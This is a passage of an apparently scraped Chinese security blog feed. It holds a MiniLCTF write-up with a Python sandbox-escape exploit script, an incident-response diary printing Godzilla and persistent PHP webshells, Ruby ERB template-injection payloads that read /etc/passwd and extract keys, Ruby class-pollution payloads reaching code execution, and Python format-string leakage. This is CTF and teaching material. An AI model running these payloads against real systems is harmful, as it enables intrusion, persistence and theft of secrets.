\u0026#34;options[http][header]\u0026#34;: \u0026#34;Host: 127.0.0.1:5000\u0026#34; }, timeout=10 ) resp.raise_for_status() # 检查HTTP错误 print(resp.json()) except requests.exceptions.RequestException as e: print(f\u0026#34;请求失败: {e}\u0026#34;) except ValueError as e: print(f\u0026#34;JSON解析失败: {e}\u0026#34;) 上传之后访问shell.php,读env\nPyBox 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 from flask import Flask, request, Response import multiprocessing import sys import io import ast app = Flask(__name__) class SandboxVisitor(ast.NodeVisitor): forbidden_attrs = { \u0026#34;__class__\u0026#34;, \u0026#34;__dict__\u0026#34;, \u0026#34;__bases__\u0026#34;, \u0026#34;__mro__\u0026#34;, \u0026#34;__subclasses__\u0026#34;, \u0026#34;__globals__\u0026#34;, \u0026#34;__code__\u0026#34;, \u0026#34;__closure__\u0026#34;, \u0026#34;__func__\u0026#34;, \u0026#34;__self__\u0026#34;, \u0026#34;__module__\u0026#34;, \u0026#34;__import__\u0026#34;, \u0026#34;__builtins__\u0026#34;, \u0026#34;__base__\u0026#34; } def visit_Attribute(self, node): if isinstance(node.attr, str) and node.attr in self.forbidden_attrs: raise ValueError self.generic_visit(node) def visit_GeneratorExp(self, node): raise ValueError def sandbox_executor(code, result_queue): safe_builtins = { \u0026#34;print\u0026#34;: print, \u0026#34;filter\u0026#34;: filter, \u0026#34;list\u0026#34;: list, \u0026#34;len\u0026#34;: len, \u0026#34;addaudithook\u0026#34;: sys.addaudithook, \u0026#34;Exception\u0026#34;: Exception } safe_globals = {\u0026#34;__builtins__\u0026#34;: safe_builtins} sys.stdout = io.StringIO() sys.stderr = io.StringIO() try: exec(code, safe_globals) output = sys.stdout.getvalue() error = sys.stderr.getvalue() result_queue.put((\u0026#34;ok\u0026#34;, output or error)) except Exception as e: result_queue.put((\u0026#34;err\u0026#34;, str(e))) def safe_exec(code: str, timeout=1): code = code.encode().decode(\u0026#39;unicode_escape\u0026#39;) tree = ast.parse(code) SandboxVisitor().visit(tree) result_queue = multiprocessing.Queue() p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue)) p.start() p.join(timeout=timeout) if p.is_alive(): p.terminate() return \u0026#34;Timeout: code took too long to run.\u0026#34; try: status, output = result_queue.get_nowait() return output if status == \u0026#34;ok\u0026#34; else f\u0026#34;Error: {output}\u0026#34; except: return \u0026#34;Error: no output from sandbox.\u0026#34; CODE = \u0026#34;\u0026#34;\u0026#34; def my_audit_checker(event,args): allowed_events = [\u0026#34;import\u0026#34;, \u0026#34;time.sleep\u0026#34;, \u0026#34;builtins.input\u0026#34;, \u0026#34;builtins.input/result\u0026#34;] if not list(filter(lambda x: event == x, allowed_events)): raise Exception if len(args) \u0026gt; 0: raise Exception addaudithook(my_audit_checker) print(\u0026#34;{}\u0026#34;) \u0026#34;\u0026#34;\u0026#34; badchars = \u0026#34;\\\u0026#34;\u0026#39;|\u0026amp;`+-*/()[]{}_.\u0026#34; @app.route(\u0026#39;/\u0026#39;) def index(): return open(__file__, \u0026#39;r\u0026#39;).read() @app.route(\u0026#39;/execute\u0026#39;,methods=[\u0026#39;POST\u0026#39;]) def execute(): text = request.form[\u0026#39;text\u0026#39;] for char in badchars: if char in text: return Response(\u0026#34;Error\u0026#34;, status=400) output=safe_exec(CODE.format(text)) if len(output)\u0026gt;5: return Response(\u0026#34;Error\u0026#34;, status=400) return Response(output, status=200) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) 过滤了 \u0026quot;__class__\u0026quot;, \u0026quot;__dict__\u0026quot;, \u0026quot;__bases__\u0026quot;, \u0026quot;__mro__\u0026quot;, \u0026quot;__subclasses__\u0026quot;, \u0026quot;__globals__\u0026quot;, \u0026quot;__code__\u0026quot;, \u0026quot;__closure__\u0026quot;, \u0026quot;__func__\u0026quot;, \u0026quot;__self__\u0026quot;, \u0026quot;__module__\u0026quot;, \u0026quot;__import__\u0026quot;, \u0026quot;__builtins__\u0026quot;, \u0026quot;__base__\u0026quot;\n白名单\u0026quot;print\u0026quot;: print, \u0026quot;filter\u0026quot;: filter, \u0026quot;list\u0026quot;: list, \u0026quot;len\u0026quot;: len, \u0026quot;addaudithook\u0026quot;: sys.addaudithook, \u0026quot;Exception\u0026quot;: Exception\n还有badchar被过滤了，但是前面有code = code.encode().decode('unicode_escape')\n可以将输入进行unicode绕过，还有白名单my_audit_checker\n第一步用unicode绕黑名单\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def to_unicode(code: str) -\u0026gt; str: BLACKLIST = set(list(r\u0026#34;\\\u0026#34;\u0026#39;|\u0026amp;`+-*/()[]{}_.\u0026#34;)) parts = [] for ch in code: if ch in BLACKLIST: parts.append(\u0026#34;\\\\u%04x\u0026#34; % ord(ch)) else: parts.append(ch) return \u0026#34;\u0026#34;.join(parts) CODE = \u0026#34;\u0026#34;\u0026#34;\u0026#34;) raise Exception(\u0026#34;echo\u0026#34;) \u0026#34;\u0026#34;\u0026#34; print(to_unicode(CODE)) 第二步利用上面白名单\n1 2 3 4 5 6 def my_audit_checker(event,args): allowed_events = [\u0026#34;import\u0026#34;, \u0026#34;time.sleep\u0026#34;, \u0026#34;builtins.input\u0026#34;, \u0026#34;builtins.input/result\u0026#34;] if not list(filter(lambda x: event == x, allowed_events)): raise Exception if len(args) \u0026gt; 0: raise Exception 这个由于__getattribute__没被ban，直接获取globals\n1 2 3 g = my_audit_checker.__getattribute__(\u0026#39;__globals__\u0026#39;) g[\u0026#34;__builtins__\u0026#34;][\u0026#34;list\u0026#34;] = lambda x: [\u0026#34;a\u0026#34;] g[\u0026#34;__builtins__\u0026#34;][\u0026#34;len\u0026#34;] = lambda x: 0 或者直接\n1 2 __builtins__[\u0026#39;list\u0026#39;] = lambda x: [\u0026#39;import\u0026#39;, \u0026#39;time.sleep\u0026#39;, \u0026#39;builtins.input\u0026#39;, \u0026#39;builtins.input/result\u0026#39;,\u0026#39;exec\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;object.__getattr__\u0026#39;] __builtins__[\u0026#39;len\u0026#39;] = lambda x: 0 因为上面的builtins白名单里面就有list和len，可以直接胁持\n注意到 builtins 还有个 Exception 可以用\n栈帧逃逸获取globals\n1 2 3 4 5 6 7 8 try: raise Exception() except Exception as e: tb = e.__traceback__ frame = tb.tb_frame while frame.f_back: frame = frame.f_back globals = frame.f_globals 然后获取builtins，接着rce了\n1 2 3 builtins = globals[\u0026#34;__builtins__\u0026#34;] res = builtins[\u0026#39;__import__\u0026#39;](\u0026#39;subprocess\u0026#39;).getoutput(\u0026#39;cat /m1* | base64 -w 0 | cut -c {}\u0026#39;) print(res[0].strip()) 或者这样获取globals\n1 2 3 4 5 6 7 def f(): global x, frame frame = x.gi_frame.f_back.f_back.f_back.f_globals yield x = f() x.send(None) raise Exception(frame) 接着\n1 raise Exception(frame[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;cat /etc/passwd\u0026#39;).read()) 用大佬的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import requests def to_unicode(code: str) -\u0026gt; str: BLACKLIST = set(list(r\u0026#34;\\\u0026#34;\u0026#39;|\u0026amp;`+-*/()[]{}_.\u0026#34;)) parts = [] for ch in code: if ch in BLACKLIST: parts.append(\u0026#34;\\\\u%04x\u0026#34; % ord(ch)) else: parts.append(ch) return \u0026#34;\u0026#34;.join(parts) CODE = r\u0026#34;\u0026#34;\u0026#34;\u0026#34;) __builtins__[\u0026#39;list\u0026#39;] = lambda x: [\u0026#39;import\u0026#39;, \u0026#39;time.sleep\u0026#39;, \u0026#39;builtins.input\u0026#39;, \u0026#39;builtins.input/result\u0026#39;,\u0026#39;exec\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;object.__getattr__\u0026#39;] __builtins__[\u0026#39;len\u0026#39;] = lambda x: 0 def f(): global x, frame frame = x.gi_frame.f_back.f_back.f_back.f_globals yield x = f() x.send(None) print(frame[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;CMD\u0026#39;).read()[N1:N2]) (\u0026#34;\\\u0026#34;\u0026#34;\u0026#34;\u0026#34; URL = \u0026#34;http://127.0.0.1:63255/execute\u0026#34; COMMAND = r\u0026#34;ls -l /\u0026#34; result = \u0026#34;\u0026#34; for i in range(0, 50, 2): resp = requests.post(URL, data={\u0026#34;text\u0026#34;: to_unicode(CODE.replace(\u0026#34;CMD\u0026#34;, COMMAND).replace(\u0026#34;N1\u0026#34;, str(i)).replace(\u0026#34;N2\u0026#34;, str(i + 2)))}) output = resp.text[1:-1] print(output) result += output print(result) suid提权\n1 find /etc/passwd -exec chmod 777 /m1* \\;然后cat /m1* 或者这个\n1 find / -name m1n1FL@G -exec cat {} \\; ","date":"2025-05-09T00:00:00Z","image":"https://0d000721999.github.io/1.png","permalink":"https://0d000721999.github.io/p/2025minilctf%E5%A4%8D%E7%8E%B0/","title":"2025MiniLCTF复现"},{"content":"玄机打靶日记 第一章 应急响应-Linux日志分析 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用\u0026quot;,\u0026ldquo;分割 查看/var/log目录下的auth.log*\n1 cat /var/log/auth.log* 发现有\n1 Failed password for root grep一下\n1 cat /var/log/auth.log* | grep -a \u0026#34;Failed password for root\u0026#34; 找到三个ip\n1 flag{192.168.200.2,192.168.200.31,192.168.200.32} 2.ssh爆破成功登陆的IP是多少，如果有多个使用\u0026rdquo;,\u0026ldquo;分割 前下看到有下面这个字段\n1 Accepted password for root grep一下\n1 cat /var/log/auth.log* | grep -a \u0026#34;Accepted password for root\u0026#34; 排除自己的ip\n1 flag{192.168.200.2} 3.爆破用户名字典是什么？如果有多个使用\u0026rdquo;,\u0026ldquo;分割 先过滤Failed password\n1 cat /var/log/auth.log* | grep -a \u0026#34;Failed password\u0026#34; 对结果进行清洗\n1 grep -a \u0026#34;Failed password\u0026#34; /var/log/auth.log.2|perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;|uniq -c|sort -nr sort -nr是逆序排序\nuniq -c统计重复行的次数，输出重复次数和内容\nfor(.*?) from正则匹配for和from中间字段\nprint \u0026quot;$1\\n\u0026quot;输出匹配的第一个字符\nwhile($_=\u0026lt;\u0026gt;)逐行读取grep后的信息\n1 cat /var/log/auth.log* | grep -a \u0026#34;Failed password\u0026#34; | awk -F \u0026#39;for \u0026#39; \u0026#39;{print $2}\u0026#39; | awk -F \u0026#39; from\u0026#39; \u0026#39;{print $1}\u0026#39; | sed \u0026#39;s/invalid user//g\u0026#39; | sed \u0026#39;s/^[ \\t]*//;s/[ \\t]*$//\u0026#39; | grep -v \u0026#39;^$\u0026#39; | uniq -c | sort -nr 这里$1前面有-F参数，含义变为输出from前的字符，$2前面也有，含义变为输出for后的字符\nsed作用去除制表符和指定的字符\n1 flag{user,hello,root,test3,test2,test1} 4.登陆成功的IP共爆破了多少次 1 cat /var/log/auth.log* | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort -n | uniq -c 或者直接看（\n1 cat /var/log/auth.log* | grep -a \u0026#34;Failed password for root from 192.168.200.2\u0026#34; 1 flag{4} 5.黑客登陆主机后新建了一个后门用户，用户名是多少 前下查看日志看到useradd\ngrep一下\n1 cat /var/log/auth.log* | grep -a \u0026#34;useradd\u0026#34; 其实已经可以看出来了，再grep linux-rz\n1 cat /var/log/auth.log* | grep -a \u0026#34;useradd\u0026#34; | grep -a \u0026#34;linux-rz\u0026#34; 或者直接找new user,或者去找/etc/passwd下的可疑用户\n1 cat auth.log.1|grep -a \u0026#34;new user\u0026#34; 1 flag{test2} 第一章 应急响应-webshell查杀 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx} 把web目录下的文件下载到本机用D盾扫描\ngz.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } //027ccd04-5065-48b6-a32d-77c704a5e26d $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; $data=file_get_contents(\u0026#34;php://input\u0026#34;); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 1 flag{027ccd04-5065-48b6-a32d-77c704a5e26d} 2.黑客使用的什么工具的shell github地址的md5 flag{md5} 一眼哥斯拉\n1 https://github.com/BeichenDream/Godzilla --\u0026gt; 39392de3218c333f794befef07ac9257 1 flag{39392de3218c333f794befef07ac9257} 3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx 1 /var/www/html/include/Db/.Mysqli.php --\u0026gt; aebac0e58cd6c5fad1695ee4d1ac1919 1 flag{aebac0e58cd6c5fad1695ee4d1ac1919} 4.黑客免杀马完整路径 md5 flag{md5} 其实D盾已经扫出来了，top.php\n我们还可以查看access.log，访问的是第七个字符\n1 cat /var/log/apache2/access.log | awk \u0026#39;{print $7}\u0026#39;|uniq -c 1 /var/www/html/wap/top.php --\u0026gt; eeff2eabfd9b7a6d26fc1a53d3f7d1de 1 flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de} 第一章 应急响应- Linux入侵排查 1.web目录存在木马，请找到木马的密码提交 到web目录下\n1 cat *.php 1 flag{1} 2.服务器疑似存在不死马，请找到不死马的密码提交 查看文件权限\n1 ls -alh index.php居然是root权限\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php include(\u0026#39;config.php\u0026#39;); include(SYS_ROOT.INC.\u0026#39;common.php\u0026#39;); $path=$_SERVER[\u0026#39;PATH_INFO\u0026#39;].($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]?\u0026#39;?\u0026#39;.str_replace(\u0026#39;?\u0026#39;,\u0026#39;\u0026#39;,$_SERVER[\u0026#39;QUERY_STRING\u0026#39;]):\u0026#39;\u0026#39;); if(substr($path, 0,1)==\u0026#39;/\u0026#39;){ $path=substr($path,1); } $path = Base::safeword($path); $ctrl=isset($_GET[\u0026#39;action\u0026#39;])?$_GET[\u0026#39;action\u0026#39;]:\u0026#39;run\u0026#39;; if(isset($_GET[\u0026#39;createprocess\u0026#39;])) { Index::createhtml(isset($_GET[\u0026#39;id\u0026#39;])?$_GET[\u0026#39;id\u0026#39;]:0,$_GET[\u0026#39;cat\u0026#39;],$_GET[\u0026#39;single\u0026#39;]); }else{ Index::run($path); } $file = \u0026#39;/var/www/html/.shell.php\u0026#39;; $code = \u0026#39;\u0026lt;?php if(md5($_POST[\u0026#34;pass\u0026#34;])==\u0026#34;5d41402abc4b2a76b9719d911017c592\u0026#34;){@eval($_POST[cmd]);}?\u0026gt;\u0026#39;; file_put_contents($file, $code); system(\u0026#39;touch -m -d \u0026#34;2021-01-01 00:00:01\u0026#34; .shell.php\u0026#39;); usleep(3000); ?\u0026gt; 向shell.php写文件的操作，查pass的MD5hash\n1 flag{hello} 3.不死马是通过哪个文件生成的，请提交文件名 1 flag{index.php} 4.黑客留下了木马文件，请找出黑客的服务器ip提交 前面ls的时候看到可以的二进制文件shell(1).elf\n微步云沙箱分析\n1 flag{10.11.55.21} 5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交 上面也可看到监听端口是3333\n1 flag{3333} 或者先执行文件，然后netstat查看\n1 2 3 chmod 777 \u0026#39;shell(1).elf\u0026#39; ./\u0026#39;shell(1).elf\u0026#39; netstat -antlp 第二章日志分析-redis应急响应 ","date":"2025-05-08T00:00:00Z","image":"https://0d000721999.github.io/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.png","permalink":"https://0d000721999.github.io/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/","title":"玄机打靶日记"},{"content":"Ruby的ERB模板注入 基本语法 \u0026lt;%写逻辑脚本(Ruby语法)%\u0026gt; \u0026lt;%=直接输出变量值或运算结果%\u0026gt; 1 2 3 4 5 6 7 8 require \u0026#39;erb\u0026#39; template = \u0026#34;text to be generated: \u0026lt;%= x %\u0026gt;\u0026#34; erb_object = ERB.new(template) x = 5 puts erb_object.result(binding()) x = 4 puts erb_object.result(binding()) 这样会输出5和4\n如果x可控，即可实现常见的ssti\n1 2 3 4 5 6 require \u0026#39;erb\u0026#39; template = \u0026#34;text to be generated: \u0026lt;%= x %\u0026gt;\u0026#34; erb_object = ERB.new(template) x = 7*7 puts erb_object.result(binding()) 还可以进行文件读取\n1 2 3 4 5 6 require \u0026#39;erb\u0026#39; template = \u0026#34;text to be generated: \u0026lt;%= x %\u0026gt;\u0026#34; erb_object = ERB.new(template) x = File.open(\u0026#39;/etc/passwd\u0026#39;).read puts erb_object.result(binding()) 枚举当前类的可用方法\n1 2 3 4 5 6 require \u0026#39;erb\u0026#39; template = \u0026#34;text to be generated: \u0026lt;%= x %\u0026gt;\u0026#34; erb_object = ERB.new(template) x = self.methods puts erb_object.result(binding()) ruby的全局变量 更准确的这个链接globals - Documentation for Ruby 2.4.0\nRuby全局变量 中文释义 $! 错误信息 $@ 错误发生的位置 $0 正在执行的程序的名称 $\u0026amp; 成功匹配的字符串 $/ 输入分隔符，默认为换行符 $\\ 输出记录分隔符（print和IO） $. 上次读取的文件的当前输入行号 $; $-F 默认字段分隔符 $, 输入字符串分隔符，连接多个字符串时用到 $= 不区分大小写 $~ 最后一次匹配数据 $` 最后一个成功匹配的字符串左侧的字符串 $’ 最后一个成功匹配的字符串右侧的字符串 $+ 最后一个括号匹配内容 $1~$9 各组匹配结果 $\u0026lt; ARGF 命令行中给定的文件的虚拟连接文件（如果未给定任何文件，则从$stdin） $\u0026gt; 打印的默认输出 $_ 从输入设备中读取的最后一行 $* ARGV 命令行参数 $$ 运行此脚本的Ruby的进程号 $? 最后执行的子进程的状态 $: $-I 加载的二进制模块（库）的路径 $“ 数组包含的需要加载的库的名字 $DEBUG $-d 调试标志，由-d开关设置 $LOADED_FEATURES $“的别名 $FILENAME 来自$\u0026lt;的当前输入文件 $LOAD_PATH $: $stderr 当前标准误差输出 $stdin 当前标准输入 $stdout 当前标准输出 $VERBOSE $-v 详细标志，由-w或-v开关设置 $-0 $/ $-a 只读 $-i 在in-place-edit模式下，此变量保存扩展名 NIL 0本身 ENV 当前环境变量 RUBY_VERSION Ruby版本 RUBY_RELEASE_DATE 发布日期 RUBY_PLATFORM 平台标识符 常用payload 1 2 3 4 5 6 7 8 9 10 \u0026lt;%= 7 * 7 %\u0026gt; \u0026lt;%= File.open(‘/etc/passwd’).read %\u0026gt; \u0026lt;%= self %\u0026gt; //枚举该对象可用的属性及方法 \u0026lt;%= self.class.name %\u0026gt; //获取self对象的类名 \u0026lt;%= self.methods %\u0026gt; \u0026lt;%= self.method(:handle_POST).parameters %\u0026gt; //获取目标所需的具体参数 \u0026lt;%= session.class.name %\u0026gt; \u0026lt;%= self.instance_variables %\u0026gt; \u0026lt;% ssl=@server.instance_variable_get(:@ssl_context) %\u0026gt;\u0026lt;%= ssl.instance_variables %\u0026gt; \u0026lt;% ssl = @server.instance_variable_get(:@ssl_context) %\u0026gt;\u0026lt;%= ssl.instance_variable_get(:@key) %\u0026gt; //提取key值 ","date":"2025-05-06T00:00:00Z","image":"https://0d000721999.github.io/p/ruby%E7%9A%84erb%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.png","permalink":"https://0d000721999.github.io/p/ruby%E7%9A%84erb%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","title":"Ruby的ERB模板注入"},{"content":"Ruby的类污染 参照这篇：浅析Ruby类污染及其在Sinatra框架下的利用-先知社区\nRuby类介绍 在Ruby中也是万物皆对象，下面定义一个Person类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Person @@cnt = 1 # 定义属性 attr_accessor :name, :age # 初始化方法 def initialize(name, age) @name = name @age = age end # 定义方法 def greet \u0026#34;My name is #{@name} and I am #{@age} years old.\u0026#34; end end person = Person.new(\u0026#34;Alice\u0026#34;, 30) puts person.greet 类变量（类似Java中类的静态变量）使用 @@前缀，实例变量使用@前缀，在类内部才用这种前缀来访问。\n冒号前缀表示符号（Symbol）。Ruby中符号是轻量级的、不可变的字符串，通常用于表示标识符、方法名或键。符号的优点是它们在内存中只存储一次，因此在需要频繁比较或使用相同字符串的情况下，使用符号可以提高性能。\nRuby对象的一些特殊的方法：\nattr_accessor：定义实例变量的getter和setter方法，用于在类外部访问实例变量 initialize：类的构造方法 to_s：toString方法 inspect：和to_s差不多，常用于debug method_missing：类似PHP的__call__方法，当调用一个不存在的方法时会触发 respond_to?：检测对象是否有某个方法或属性 send：根据方法名来调用（包括私有方法） public_send：根据方法名调用公开方法 Ruby对象的一些特殊的属性（类也算对象）\nclass：当前对象的类 superclass：父类 subclasses：子类数组 instance_variables：实例变量名的数组 class_variables：类变量名的数组 在 Ruby 中，所有类的顶层父类是 BasicObject。BasicObject 是 Ruby 类层次结构中的根类，所有其他类都直接或间接地继承自它。\n1 2 3 4 5 6 class MyClass end puts MyClass.superclass # Output: Object puts Object.superclass # Output: BasicObject puts BasicObject.superclass # Output: nil 在实际污染中，用到的就是class、superclass、subclasses，先从当前对象找到当前类，回溯到父类Object，锁定要污染的变量所在的类，在从父类一层层找子类。\n不安全的递归合并 Doyensec的文章中给出下面的merge函数，也介绍了两个实际案例，分别是Ruby on Rails的内置组件ActiveSupport提供的deep_merge，以及Hashie库提供的deep_merge\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def recursive_merge(original, additional, current_obj = original) additional.each do |key, value| if value.is_a?(Hash) if current_obj.respond_to?(key) next_obj = current_obj.public_send(key) recursive_merge(original, value, next_obj) else new_object = Object.new current_obj.instance_variable_set(\u0026#34;@#{key}\u0026#34;, new_object) current_obj.singleton_class.attr_accessor key end else current_obj.instance_variable_set(\u0026#34;@#{key}\u0026#34;, value) current_obj.singleton_class.attr_accessor key end end original end recursive_merge用于递归地合并两个对象original和additional\n遍历additional对象中的每个键值对。 处理嵌套的哈希：如果值是一个哈希，它会检查 current_obj（初始为 original）是否响应该键。如果响应，则递归合并嵌套的哈希。如果不响应，则创建一个新对象，将其设置为实例变量，并为其创建访问器。 处理非哈希值：如果值不是哈希，则直接在 current_obj 上设置该值为实例变量，并为其创建访问器。 污染当前对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class A attr_accessor :x def initialize(x) @x = x end def merge_with(additional) recursive_merge(self, additional) end def check protected_methods().each do |method| instance_eval(method.to_s) end end end 若能污染protected_methods，其返回值就能传入instance_eval进行代码执行。\n1 2 3 4 5 a = A.new(1) a.merge_with({ \u0026#34;protected_methods\u0026#34;: [\u0026#34;`calc`\u0026#34;] }) a.check 当然这种污染的是当前的对象的属性，不影响父类以及其他实例对象。\n污染父类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Base @@cmd = \u0026#34;puts 1\u0026#34; end class Cmder \u0026lt; Base def merge_with(additional) recursive_merge(self, additional) end def check eval(Base.cmd) # eval(@@cmd) 污染失败 \u0026#34;ok\u0026#34; end end 对于这种情况，可以污染父类的cmd变量，但这里实际上是给父类Base增加了一个实例变量@cmd，从而通过Base.cmd访问时，实例变量@cmd遮盖了类变量@@cmd\n1 2 3 4 5 6 7 8 9 10 11 c = Cmder.new c.merge_with({ \u0026#34;class\u0026#34;: { \u0026#34;superclass\u0026#34;: { \u0026#34;cmd\u0026#34;: \u0026#34;`calc`\u0026#34; } } }) c.check puts Base.class_variables # @@cmd puts Base.instance_variables # @cmd 污染其他类 1 2 3 4 5 6 7 8 9 10 11 12 13 class Cmder @@cmd = \u0026#34;puts 1\u0026#34; def check eval(Cmder.cmd) end end class Innocent def merge_with(additional) recursive_merge(self, additional) end end subclasses可以获取到Object的子类，但返回的是数组，可以利用数组的sample方法，随机返回一个元素\n通过多次污染，总有几率污染到Cmder这个子类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 1000.times do i = Innocent.new i.merge_with({ \u0026#34;class\u0026#34;: { \u0026#34;superclass\u0026#34;: { \u0026#34;subclasses\u0026#34;: { \u0026#34;sample\u0026#34;: { \u0026#34;cmd\u0026#34;: \u0026#34;`calc`\u0026#34; } } } } }) end c = Cmder.new c.check Doyensec的文章中提到了污染Person的url变量来进行SSRF，以及污染KeySigner的signing_key变量来实现伪造签名数据。\n类污染设置静态目录 Sinatra框架中是通过如下配置来设置静态目录的\n1 set :public_folder, File.dirname(__FILE__) + \u0026#39;/static\u0026#39; 跟进set方法可以发现他实际就是给Sinatra::Base设置了一个属性的getter、setter\nclass_eval给类动态定义方法\n因此可以污染public_folder这个属性来修改静态目录\n1 {\u0026#34;class\u0026#34;:{\u0026#34;superclass\u0026#34;:{\u0026#34;superclass\u0026#34;:{\u0026#34;subclasses\u0026#34;:{\u0026#34;sample\u0026#34;:{\u0026#34;public_folder\u0026#34;: \u0026#34;E:/Server\u0026#34;}}}}}} 类污染写ERB模板 调试可知Sinatra::Base有个templates属性，类型是哈希，猜测他是存放模板的\nSinatra 默认模板位于./views目录，也支持通过如下语句定义模板\n1 2 3 template :index do \u0026#39;%div.title Hello World!\u0026#39; end 可以看到template方法实际就是给templates这个属性赋值（block是个代码块，需要返回模板内容的字符串）\n有如下渲染模板的路由\n1 2 3 get(\u0026#39;/\u0026#39;) do erb :hello end ERB (Embedded Ruby) 是 Ruby 标准库自带的，它允许在文本文件中嵌入 Ruby 代码，通常用于生成 HTML 文件，就是一个模板引擎。\n可以污染templates属性，覆盖hello模板，通过ERB模板实现RCE\n1 {\u0026#34;class\u0026#34;:{\u0026#34;superclass\u0026#34;:{\u0026#34;superclass\u0026#34;:{\u0026#34;subclasses\u0026#34;:{\u0026#34;sample\u0026#34;:{\u0026#34;templates\u0026#34;: {\u0026#34;hello\u0026#34;: \u0026#34;\u0026lt;%= `calc` %\u0026gt;\u0026#34;}}}}}}} ","date":"2025-05-06T00:00:00Z","image":"https://0d000721999.github.io/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/1.png","permalink":"https://0d000721999.github.io/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/","title":"Ruby的类污染"},{"content":"python格式化字符串漏洞 参考：Python Web之flask session\u0026amp;格式化字符串漏洞-先知社区\n在 python 中，提供了 4种 主要的格式化字符串方式，分别如下：\n%操作符 %操作符 沿袭C语言中printf语句的风格。\n1 2 3 \u0026gt;\u0026gt;\u0026gt; name = \u0026#39;Bob\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;Hello, %s\u0026#39; % name \u0026#34;Hello, Bob\u0026#34; string.Template 使用标准库中的模板字符串类进行字符串格式化。\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; name = \u0026#39;Bob\u0026#39; \u0026gt;\u0026gt;\u0026gt; from string import Template \u0026gt;\u0026gt;\u0026gt; t = Template(\u0026#39;Hey, $name!\u0026#39;) \u0026gt;\u0026gt;\u0026gt; t.substitute(name=name) \u0026#39;Hey, Bob!\u0026#39; 调用format方法 python3后引入的新版格式化字符串写法，但是这种写法存在安全隐患。\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; name , errno = \u0026#39;Bob\u0026#39; , 50159747054 \u0026gt;\u0026gt;\u0026gt; \u0026#39;Hello, {}\u0026#39;.format(name) \u0026#39;Hello, Bob\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;Hey {name}, there is a 0x{errno:x} error!\u0026#39;.format(name=name, errno=errno) \u0026#39;Hey Bob, there is a 0xbadc0ffee error!\u0026#39; 存在安全隐患的事例代码：\n1 2 3 4 5 6 7 8 \u0026gt;\u0026gt;\u0026gt; config = {\u0026#39;SECRET_KEY\u0026#39;: \u0026#39;12345\u0026#39;} \u0026gt;\u0026gt;\u0026gt; class User(object): ... def __init__(self, name): ... self.name = name ... \u0026gt;\u0026gt;\u0026gt; user = User(\u0026#39;joe\u0026#39;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;{0.__class__.__init__.__globals__[config]}\u0026#39;.format(user) \u0026#34;{\u0026#39;SECRET_KEY\u0026#39;: \u0026#39;12345\u0026#39;}\u0026#34; 如果用来格式化的字符串可以被控制，攻击者就可以通过注入特殊变量，带出敏感数据。\nf-Strings 这是python3.6之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的python表达式\n1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; a , b = 5 , 10 \u0026gt;\u0026gt;\u0026gt; f\u0026#39;Five plus ten 